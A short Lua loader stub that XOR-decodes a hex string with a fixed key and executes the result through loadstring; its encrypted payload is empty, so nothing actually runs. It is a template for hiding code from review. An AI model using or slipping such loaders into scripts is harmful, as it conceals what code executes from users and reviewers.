local k={78,166,196,177,230,139,2,243,4,116,201,176,255,153,237,133,16,205,77,51,166,99,214,192,66,207,143,227,102,124,218,210}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
